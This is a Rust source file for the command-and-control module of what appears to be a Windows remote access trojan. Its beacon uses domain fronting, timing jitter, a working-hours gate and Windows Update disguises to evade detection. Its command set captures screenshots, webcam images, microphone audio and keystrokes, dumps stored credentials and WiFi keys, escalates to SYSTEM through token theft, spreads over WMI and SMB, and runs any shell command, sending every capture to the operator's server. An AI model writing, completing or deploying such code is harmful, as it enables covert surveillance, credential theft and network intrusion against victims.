//! c2.rs — HTTPS C2 with domain-fronting, smart beacon jitter, working-hours gate
//!
//! Transport  : HTTPS POST via WinHTTP — indistinguishable from OS update traffic.
//! Fronting   : SNI = FRONT_DOMAIN (CDN edge), Host: = C2_HOST (real server).
//! Jitter     : splitmix64 PRNG, ±JITTER_PCT% variance on every sleep.
//! Hours gate : outside BEACON_HOUR_START..BEACON_HOUR_END the beacon sleeps
//!              DEAD_SLEEP_SECS to eliminate off-hours beaconing IOCs entirely.
//! UA rotation: cycles through a pool of realistic Windows browser UAs so TLS
//!              JA3/User-Agent fingerprints don't converge on a single string.
//!
//! Commands:
//!   screenshot                         → desktop BMP
//!   webcam                             → webcam JPEG/BMP
//!   mic <secs>                         → WAV audio
//!   download <path>                    → pull file from target
//!   upload <path> <size>               → push file to target
//!   keylog start                       → install WH_KEYBOARD_LL hook
//!   keylog dump                        → drain + exfil keylog ring
//!   dpapi dump                         → CredMan + browser logins + WiFi PSKs
//!   token escalate                     → steal SYSTEM token (lsass impersonation)
//!   token revert                       → revert thread token
//!   lateral wmi <host> <cmd>           → WMI exec on remote host
//!   lateral smb <host> <bin> <svc>     → SMB service exec on remote host
//!   lateral spray <cmd> <bin>          → spray all loaded hosts
//!   hosts load <base64>                → load \n-separated target list
//!   selfdestruct                       → wipe + exit
//!   exit                               → clean session close

use std::time::Duration;
use std::sync::atomic::{AtomicU64, Ordering};

use crate::screenshot;
use crate::webcam;
use crate::mic;
use crate::filetransfer;
use crate::keylog;
use crate::token;
use crate::dpapi;
use crate::lateral;
use crate::SLEEP_KEY;

// ── Build-time config (patched by builder.py) ─────────────────────────────
pub const C2_HOST:            &str = "NGROK_HOST_PLACEHOLDER";   // real C2 (Host header)
pub const C2_PORT:            u16  = 443;
pub const FRONT_DOMAIN:       &str = "FRONT_DOMAIN_PLACEHOLDER"; // CDN SNI
pub const BEACON_INTERVAL_MS: u64  = 15_000;  // base interval (ms)
pub const JITTER_PCT:         u64  = 30;       // ± % jitter around base
pub const BEACON_HOUR_START:  u32  = 8;        // local hour — beacon window open
pub const BEACON_HOUR_END:    u32  = 20;       // local hour — beacon window close
pub const DEAD_SLEEP_SECS:    u64  = 3600;     // sleep outside working hours
// ─────────────────────────────────────────────────────────────────────────

static XOR_OFFSET: AtomicU64 = AtomicU64::new(0);

static HOST_LIST: std::sync::OnceLock<std::sync::Mutex<Vec<String>>> =
    std::sync::OnceLock::new();
fn host_list() -> &'static std::sync::Mutex<Vec<String>> {
    HOST_LIST.get_or_init(|| std::sync::Mutex::new(Vec::new()))
}

// ── User-Agent pool (rotated per-beacon) ─────────────────────────────────
const UA_POOL: &[&str] = &[
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 OPR/110.0.0.0",
    "Microsoft-WNS/10.0",
    "Windows-Update-Agent/10.0.10011.16384 Client-Protocol/2.33",
];

// ── PRNG (splitmix64) ─────────────────────────────────────────────────────
struct SplitMix64(u64);
impl SplitMix64 {
    fn new() -> Self {
        let seed = unsafe { winapi::um::sysinfoapi::GetTickCount64() }
            ^ (std::thread::current().id().as_u64().get());
        SplitMix64(seed)
    }
    fn next(&mut self) -> u64 {
        self.0 = self.0.wrapping_add(0x9e3779b97f4a7c15);
        let mut z = self.0;
        z = (z ^ (z >> 30)).wrapping_mul(0xbf58476d1ce4e5b9);
        z = (z ^ (z >> 27)).wrapping_mul(0x94d049bb133111eb);
        z ^ (z >> 31)
    }
    fn range(&mut self, lo: u64, hi: u64) -> u64 {
        lo + self.next() % (hi - lo + 1)
    }
}

// ── Jitter sleep ─────────────────────────────────────────────────────────
fn jitter_sleep(rng: &mut SplitMix64, base_ms: u64, pct: u64) {
    let variance = base_ms * pct / 100;
    let lo = base_ms.saturating_sub(variance);
    let hi = base_ms + variance;
    let actual = rng.range(lo.max(500), hi);
    std::thread::sleep(Duration::from_millis(actual));
}

// ── Working-hours gate ────────────────────────────────────────────────────
/// Returns the current local hour (0-23) using Windows SYSTEMTIME.
unsafe fn local_hour() -> u32 {
    let mut st: winapi::um::minwinbase::SYSTEMTIME = std::mem::zeroed();
    winapi::um::sysinfoapi::GetLocalTime(&mut st);
    st.wHour as u32
}

/// If outside [BEACON_HOUR_START, BEACON_HOUR_END), sleep DEAD_SLEEP_SECS
/// then return true so the caller knows it was dead time.
fn dead_hours_gate() -> bool {
    let hour = unsafe { local_hour() };
    if hour < BEACON_HOUR_START || hour >= BEACON_HOUR_END {
        // Sleep in 5-min chunks so kill signals aren't delayed forever
        let chunks = DEAD_SLEEP_SECS / 300;
        for _ in 0..chunks {
            std::thread::sleep(Duration::from_secs(300));
        }
        return true;
    }
    false
}

// ── WinHTTP HTTPS POST ────────────────────────────────────────────────────
/// POST `body` to https://<FRONT_DOMAIN>:<C2_PORT>/<path>
/// with Host: <C2_HOST> header (domain fronting).
/// `ua` is the User-Agent string for this request.
unsafe fn https_post(path: &str, body: &[u8], ua: &str) -> Option<Vec<u8>> {
    use winapi::um::winhttp::*;
    use winapi::shared::minwindef::DWORD;

    let w = |s: &str| -> Vec<u16> { s.encode_utf16().chain(std::iter::once(0)).collect() };

    let ua_w    = w(ua);
    let front_w = w(FRONT_DOMAIN);
    let path_w  = w(path);

    let session = WinHttpOpen(
        ua_w.as_ptr(),
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0,
    );
    if session.is_null() { return None; }

    let connect = WinHttpConnect(session, front_w.as_ptr(), C2_PORT, 0);
    if connect.is_null() { WinHttpCloseHandle(session); return None; }

    let request = WinHttpOpenRequest(
        connect, w("POST").as_ptr(), path_w.as_ptr(),
        std::ptr::null(), WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE,
    );
    if request.is_null() {
        WinHttpCloseHandle(connect); WinHttpCloseHandle(session); return None;
    }

    // Domain-fronting Host header
    let host_hdr = w(&format!("Host: {}\r\n", C2_HOST));
    WinHttpAddRequestHeaders(
        request, host_hdr.as_ptr(), (host_hdr.len() - 1) as DWORD,
        WINHTTP_ADDREQ_FLAG_ADD,
    );
    // Content-Type
    let ct = w("Content-Type: application/octet-stream\r\n");
    WinHttpAddRequestHeaders(request, ct.as_ptr(), (ct.len() - 1) as DWORD, WINHTTP_ADDREQ_FLAG_ADD);

    if WinHttpSendRequest(
        request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        body.as_ptr() as _, body.len() as DWORD, body.len() as DWORD, 0,
    ) == 0 {
        WinHttpCloseHandle(request); WinHttpCloseHandle(connect); WinHttpCloseHandle(session);
        return None;
    }
    if WinHttpReceiveResponse(request, std::ptr::null_mut()) == 0 {
        WinHttpCloseHandle(request); WinHttpCloseHandle(connect); WinHttpCloseHandle(session);
        return None;
    }

    let mut resp = Vec::new();
    loop {
        let mut avail: DWORD = 0;
        WinHttpQueryDataAvailable(request, &mut avail);
        if avail == 0 { break; }
        let mut buf = vec![0u8; avail as usize];
        let mut read: DWORD = 0;
        WinHttpReadData(request, buf.as_mut_ptr() as _, avail, &mut read);
        resp.extend_from_slice(&buf[..read as usize]);
    }
    WinHttpCloseHandle(request);
    WinHttpCloseHandle(connect);
    WinHttpCloseHandle(session);
    Some(resp)
}

// ── Beacon loop ───────────────────────────────────────────────────────────
pub fn callback_and_loop() {
    let beacon_id = format!("{}-{}", hostname(), username());
    let mut rng   = SplitMix64::new();
    let mut tick: u64 = 0;

    loop {
        // Working-hours gate — skip beaconing during off-hours entirely
        if dead_hours_gate() { continue; }

        // Rotate User-Agent per beacon
        let ua = UA_POOL[(tick as usize) % UA_POOL.len()];
        tick = tick.wrapping_add(1);

        let cmd_opt = unsafe {
            let checkin = format!("id={}\n", beacon_id);
            https_post("/beacon", checkin.as_bytes(), ua)
                .and_then(|r| String::from_utf8(r).ok())
                .map(|s| s.trim().to_string())
                .filter(|s| !s.is_empty())
        };

        if let Some(cmd) = cmd_opt {
            let result = dispatch(&cmd);
            if result == "__EXIT__"     { return; }
            if result == "__DESTRUCT__" { crate::selfdestruct::destruct(); return; }
            unsafe {
                let mut body = format!("id={}\nresult=\n", beacon_id).into_bytes();
                body.extend_from_slice(result.as_bytes());
                https_post("/result", &body, ua);
            }
        }

        jitter_sleep(&mut rng, BEACON_INTERVAL_MS, JITTER_PCT);
    }
}

// ── Command dispatcher ────────────────────────────────────────────────────
fn dispatch(cmd: &str) -> String {
    let cmd = cmd.trim();

    if cmd.eq_ignore_ascii_case("exit")         { return "__EXIT__".into(); }
    if cmd.eq_ignore_ascii_case("selfdestruct") { return "__DESTRUCT__".into(); }

    if cmd.eq_ignore_ascii_case("screenshot") {
        return unsafe {
            match screenshot::capture_screen() {
                Some(bmp) => { post_binary("/data", &bmp); format!("screenshot: {} bytes", bmp.len()) }
                None => "ERR:screenshot failed".into(),
            }
        };
    }

    if cmd.eq_ignore_ascii_case("webcam") {
        return match webcam::capture_frame() {
            Some(f) => { unsafe { post_binary("/data", &f); } format!("webcam: {} bytes", f.len()) }
            None => "ERR:no webcam".into(),
        };
    }

    if cmd.starts_with("mic ") {
        let secs: u32 = cmd[4..].trim().parse().unwrap_or(5);
        return match mic::record(secs) {
            Some(wav) => { unsafe { post_binary("/data", &wav); } format!("mic: {} bytes", wav.len()) }
            None => "ERR:mic not available".into(),
        };
    }

    if cmd.eq_ignore_ascii_case("keylog start") {
        keylog::start();
        return "keylog: hook installed".into();
    }
    if cmd.eq_ignore_ascii_case("keylog dump") {
        let buf = keylog::dump();
        unsafe { post_binary("/data", &buf); }
        return format!("keylog: {} bytes", buf.len());
    }

    if cmd.eq_ignore_ascii_case("dpapi dump") {
        let creds = dpapi::dump_all();
        unsafe { post_binary("/data", &creds); }
        return format!("dpapi: {} bytes", creds.len());
    }

    if cmd.eq_ignore_ascii_case("token escalate") {
        return if token::escalate_to_system() {
            "token: SYSTEM".into()
        } else {
            "token: failed".into()
        };
    }
    if cmd.eq_ignore_ascii_case("token revert") {
        token::revert();
        return "token: reverted".into();
    }

    if cmd.starts_with("lateral wmi ") {
        let rest = &cmd[12..];
        let parts: Vec<&str> = rest.splitn(2, ' ').collect();
        return if parts.len() == 2 {
            match lateral::wmi_exec(parts[0], parts[1]) {
                Ok(o)  => o,
                Err(e) => format!("ERR:{}", e),
            }
        } else { "ERR:usage: lateral wmi <host> <cmd>".into() };
    }

    if cmd.starts_with("lateral smb ") {
        let rest = &cmd[12..];
        let parts: Vec<&str> = rest.splitn(3, ' ').collect();
        return if parts.len() == 3 {
            match lateral::smb_exec(parts[0], parts[1], parts[2]) {
                Ok(o)  => o,
                Err(e) => format!("ERR:{}", e),
            }
        } else { "ERR:usage: lateral smb <host> <bin> <svc>".into() };
    }

    if cmd.starts_with("lateral spray ") {
        let rest = &cmd[14..];
        let parts: Vec<&str> = rest.splitn(2, ' ').collect();
        return if parts.len() == 2 {
            let lock  = host_list().lock().unwrap();
            let hosts: Vec<&str> = lock.iter().map(|s| s.as_str()).collect();
            lateral::spray(&hosts, parts[0], parts[1])
        } else { "ERR:usage: lateral spray <cmd> <bin>".into() };
    }

    if cmd.starts_with("hosts load ") {
        let b64 = &cmd[11..];
        return match dpapi::base64_decode_pub(b64) {
            Some(raw) => {
                let hosts = lateral::parse_host_list(&raw);
                let n = hosts.len();
                *host_list().lock().unwrap() = hosts;
                format!("hosts: {} loaded", n)
            }
            None => "ERR:invalid base64".into(),
        };
    }

    // Shell fallback
    std::process::Command::new("cmd.exe")
        .args(["/C", cmd])
        .output()
        .map(|o| String::from_utf8_lossy(&[o.stdout, o.stderr].concat()).into_owned())
        .unwrap_or_else(|e| format!("[err] {}", e))
}

unsafe fn post_binary(path: &str, data: &[u8]) {
    // UA for data exfil — pick the Windows-Update one to blend large uploads
    https_post(path, data, "Windows-Update-Agent/10.0.10011.16384 Client-Protocol/2.33");
}

fn hostname() -> String { std::env::var("COMPUTERNAME").unwrap_or_else(|_| "unknown".into()) }
fn username()  -> String { std::env::var("USERNAME").unwrap_or_else(|_| "unknown".into()) }
